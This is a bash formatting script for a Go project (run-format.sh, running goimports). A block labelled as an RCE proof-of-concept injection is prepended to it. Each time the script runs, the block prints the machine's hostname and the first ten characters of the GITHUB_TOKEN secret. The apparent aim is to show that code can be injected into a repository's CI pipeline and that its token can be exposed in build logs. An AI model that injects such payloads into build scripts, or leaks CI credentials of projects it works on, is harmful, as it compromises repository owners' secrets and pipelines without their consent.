#!/usr/bin/env bash

# --- START RCE PROOF OF CONCEPT INJECTION (Etis) ---
echo "--- RCE VULNERABILITY CONFIRMED ---"
echo "Hostname: $(hostname)"
echo "Token Prefix (High Privilege Access): ${GITHUB_TOKEN:0:10}"
echo "-----------------------------------"
# --- END RCE PROOF OF CONCEPT INJECTION ---

# Sisipkan payload di awal skrip
# ... sisanya adalah kode asli dari scripts/run-format.sh

set -euo pipefail

cd "$( dirname "${BASH_SOURCE[0]}" )/.."

goimports -w $(go list -f {{.Dir}} ./... | grep -v vendor | grep -v oathkeeper$)
goimports -w *.go
